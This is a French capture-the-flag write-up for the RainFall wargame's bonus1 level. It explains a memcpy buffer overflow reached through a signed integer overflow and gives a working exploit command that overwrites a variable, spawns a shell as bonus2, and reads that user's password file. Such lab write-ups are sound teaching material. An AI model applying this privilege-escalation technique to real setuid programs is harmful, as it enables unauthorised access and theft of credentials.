## Comportement
- J'ai des droits `bonus1` que je peux vérifier en tapant `whoami`
- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1*`
- En exécutant le binaire (`./bonus1`), on observe qu'il attend 1 argument de la part de l'utilisateur et puis quitte. Sans argument il segfault.
    ```shell
        bonus1@RainFall:~$ ./bonus1 
        Segmentation fault (core dumped)
        bonus1@RainFall:~$ ./bonus1 test
        bonus1@RainFall:~$ ./bonus1 test test
    ```


## Analyse
- Le programme présente une vulnérabilité de type buffer overflow au niveau de l'appel à `memcpy()`. 
- On voit l'ouverture d'un nouveau shell via l'appel a `execl()` : donc pas besoin de shellcode.
- 2 checks sont realises : 
    - Pour accéder à `memcpy()`, `nb` doit être inférieur ou égal à 9.
    - Ensuite, `nb` est comparé à `0x574f4c46` (== 1464814662)
- Il faut donc changer la valeur de `nb` (par `0x574f4c46`) en debordant du `memcpy()`. L'emplacements memoires de `str` et `nb` sont contingent, donc en écrivant suffisamment loin dans `str` on pourrait écrire sur `nb` (40 caractères pour str et 4 autres pour écrire sur nb == 44 caracteres). Le souci est que `memcpy()` ne copiera que 4 * nb octets de argv[2], donc 36 est le maximum qui peut être copié dans le tampon (9 * 4 = 36). 
- Nous pouvons fournir à `memcpy()` un nb négatif : La valeur de nb est stockée dans un `DWORD` (32 bits), la valeur minimale d'un entier signé de 32 bits est `-2147483647`. La multiplication par 4, en raison de la manière dont les entiers signés sont représentés en binaire, nous donne techniquement 4. Nous pouvons manipuler cela pour exploiter la vulnérabilité. En ajustant les 32 premiers bits de int_min * 4 pour obtenir 44 (0b101100), nous pouvons trouver le bon nombre décimal à fournir. 
    ```shell
        random_int   = 1111 1111 1111 1111 1111 1111 1111 1110 | 0000 0000 0000 0000 0000 0000 0010 1100 = 44 (-8589934548)
        random_int/4 = -2147483637
    ```


## Résolution
- Notre premier argument est `-2147483637`, qui est inférieur à 9 et nous donnera 44 lorsqu'il est multiplié par 4. Pour le second argument, nous devons remplir le tampon avec les 40 premiers octets (padding). Les 4 derniers octets effaceront ensuite la valeur de nb et la remplaceront par `0x574f4c46`.
- On craft notre payload: 
    ```shell
        bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "B" * 40 + "\x46\x4c\x4f\x57"')
        $ whoami
        bonus2
        $ cat /home/user/bonus2/.pass
    ```
- Il ne reste plus qu'à passer au bonus2 (`su bonus2`) en renseignant le password.

